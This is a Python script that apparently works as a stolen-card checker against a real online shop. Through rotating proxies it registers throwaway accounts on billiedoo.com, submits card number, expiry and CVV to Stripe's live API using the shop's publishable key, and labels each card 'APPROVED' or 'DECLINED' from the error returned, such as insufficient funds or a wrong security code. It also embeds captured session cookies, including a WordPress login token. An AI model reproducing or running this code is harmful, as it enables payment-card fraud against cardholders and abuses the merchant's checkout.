import requests
from parse import parseX
import AdyenEncrypt
import names
import random

proxiess = "proxys.txt"

def stripe(tarjeta):
    try:
        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 2:
            ano = "20" + ano
        
        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
        
        headers = {
            'Referer': 'https://www.billiedoo.com/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.get('https://www.billiedoo.com/my-account/', headers=headers).text
        register = parseX(response, 'name="woocommerce-register-nonce" value="', '"')
        
        print(register)
        
        headers = {
            'authority': 'www.billiedoo.com',
            # 'cookie': 'tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-13%2006%3A44%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.billiedoo.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-13%2006%3A44%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.billiedoo.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; cf_clearance=c8fLI2xiQAXem5FTUf05Yf5bfSW4s4.te5APe2BiI8k-1707806670-1-ASE/qnWZbwwByHjQr7gBAzjqi78ls7Uzr1kpOPLCqwFpNRrS3vimL+LMKHX/aL2BqXcPi/HTUVI9bC8XV+tOHuw=; cookieconsent_status={"categories":["necessary","analytics"],"level":["necessary","analytics"],"revision":0,"data":null,"rfc_cookie":false,"consent_date":"2024-02-13T06:44:36.329Z","consent_uuid":"ffb2e980-3696-4948-95db-8e43814c3026","last_consent_update":"2024-02-13T06:44:36.329Z"}; _ga=GA1.1.1395142804.1707806670; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.billiedoo.com%2Fmy-account%2F%23register; _ga_35Q322WBE5=GS1.1.1707806670.1.1.1707806732.0.0.0',
            'origin': 'https://www.billiedoo.com',
            'referer': 'https://www.billiedoo.com/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        data = {
            'email': CorreoRand,
            'password': 'Kurama#1212',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = session.post('https://www.billiedoo.com/my-account/', headers=headers, data=data)
        
        headers = {
            'Referer': 'https://www.billiedoo.com/my-account/payment-methods/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = session.get('https://www.billiedoo.com/my-account/add-payment-method/', headers=headers).text
        nonce = parseX(response, '"add_card_nonce":"', '"')
        
        print(nonce)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        data = f'type=card&billing_details[name]=+&billing_details[email]={CorreoRand}&card[number]={ccnum}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=02b1cc43-2590-4544-b256-8e2087b604d0bc5c06&muid=f5c2bf59-74b2-4637-b310-e248df45e62d9a4197&sid=ddc674ed-0e56-481e-b83c-b2e8e31a80e76323aa&payment_user_agent=stripe.js%2F3315d1529b%3B+stripe-js-v3%2F3315d1529b%3B+split-card-element&referrer=https%3A%2F%2Fwww.billiedoo.com&time_on_page=23612&key=pk_live_CZ7rW17Ow6Fx60VjDfhkn0gd'

        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).text
        id_ = parseX(response, '"id": "', '"')
        if "None" in id_:
            msg = "DECLINED ❌"
            respuesta = "Card number incorrect."
            return msg, respuesta
        
        print(id_)
        
        headers = {
            'authority': 'www.billiedoo.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-13%2006%3A44%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.billiedoo.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-13%2006%3A44%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.billiedoo.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; cf_clearance=c8fLI2xiQAXem5FTUf05Yf5bfSW4s4.te5APe2BiI8k-1707806670-1-ASE/qnWZbwwByHjQr7gBAzjqi78ls7Uzr1kpOPLCqwFpNRrS3vimL+LMKHX/aL2BqXcPi/HTUVI9bC8XV+tOHuw=; cookieconsent_status={"categories":["necessary","analytics"],"level":["necessary","analytics"],"revision":0,"data":null,"rfc_cookie":false,"consent_date":"2024-02-13T06:44:36.329Z","consent_uuid":"ffb2e980-3696-4948-95db-8e43814c3026","last_consent_update":"2024-02-13T06:44:36.329Z"}; _ga=GA1.1.1395142804.1707806670; wordpress_logged_in_478a3ff1f6914c4dcf87deed602a4663=naneteharlequin%7C1709016334%7C7AaIDvTz69fcS1sy9oaffjc68i7SGCHwISgjmfXdaS9%7Cdbb4b852fc40b70d1f2b49408951c150d436596f94bd99ce1ffb9163d01029bc; tk_ai=DiKnKa07cNekxeRCQfru%2Btw7; __stripe_mid=f5c2bf59-74b2-4637-b310-e248df45e62d9a4197; __stripe_sid=ddc674ed-0e56-481e-b83c-b2e8e31a80e76323aa; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.billiedoo.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=; _ga_35Q322WBE5=GS1.1.1707806670.1.1.1707806813.0.0.0',
            'origin': 'https://www.billiedoo.com',
            'referer': 'https://www.billiedoo.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id_,
            'nonce': nonce,
        }

        response = session.post('https://www.billiedoo.com/', params=params, headers=headers, data=data).text
        
        code = parseX(response, '"message":"', '"')
        
        if int(response.find('"status":"success"')) > 0 :
                msg = "APPROVED *AUTH*✅"
                respuesta = "SUBSCRIPTION COMPLETED SUCCESSFULLY"
                
        elif int(response.find('requires_action')) > 0 :
                msg = "DECLINED 3D❌"
                respuesta = "3D Required"
                
        elif "Your card has insufficient funds." in code:
                respuesta = code
                msg = "APPROVED *CVV*✅"
                
        elif "Your card's security code is incorrect." in code:
                respuesta = code
                msg = "APPROVED *CCN*✅"
            
        else:
                respuesta = code
                msg = "DECLINED ❌"
                
        session.close()
        
        print(msg, "STMAX")
        return msg, respuesta
                
                
            
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED ❌"
        respuesta = "Ha ocurrido un error"
        
        return msg, respuesta
